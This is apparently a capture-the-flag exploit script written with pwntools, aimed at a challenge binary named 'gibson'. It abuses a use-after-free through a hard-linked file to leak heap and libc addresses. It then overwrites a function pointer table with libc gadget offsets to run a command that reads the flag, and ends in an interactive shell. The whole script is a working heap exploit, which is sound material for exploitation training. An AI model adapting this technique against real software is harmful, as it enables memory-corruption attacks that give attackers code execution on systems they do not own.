from pwn import *
# context.log_level='debug'
context.arch='amd64'
# context.terminal = ['tmux','split','-h']
p=process("/opt/chal/gibson")
# p=remote("http://offsec-chalbroker.osiris.cyber.nyu.edu/",8080)
sla 	= lambda a,b: p.sendlineafter(a,b)
sa 		= lambda a,b: p.sendafter(a,b)
ra 		= lambda a,b: p.readuntil(a,b)
sl      = lambda a: p.sendline(a)
def cmd(c):
    sla("> ",c)
def add(name,size=0x18,c="A"):
	cmd("touch")
	sla("?\n",name)
	sla("?\n",str(size))
	sla(":\n",c)
def link(f1,f2):
    cmd("ln")
    sla("?\n",f1)
    sla("?\n",f2)
def free(name):
	cmd("rm")
	sla("?\n",name)
def show(c):
	cmd("cat")
	sla("?\n",c)
def edit(fname,c):
	cmd('edit')
	sla("?\n",fname)
	sla(":\n",c)
add("Z")
add("X")
add("A",0x100)
link("A","B")
free("Z")
free("A")
show("B")
p.read(0x10)
heap  = u64(p.read(8))-(0x605480-0x00604000)
p.read(0xc8)
base = u64(p.read(8)) - (0x7ffff7dd1b78-0x00007ffff7a0d000)
log.warning(hex(heap))
log.warning(hex(base))
free("X")
add("N",0x28)



pay = p64(0)*10+"n132\0\0\0\0"+p64(0)*9+p64(0x000000000603080)+p64(0x30)
edit("B",pay)

edit("n132",p64(0x45390+base)+p64(0xcd2b0+base)+p64(0x8b470+base))
cmd("exit")
cmd("touch")
# gdb.attach(p,'b system')

sla("?\n","n132")
sla("?\n","cat /opt/chal/flag.txt")

p.interactive()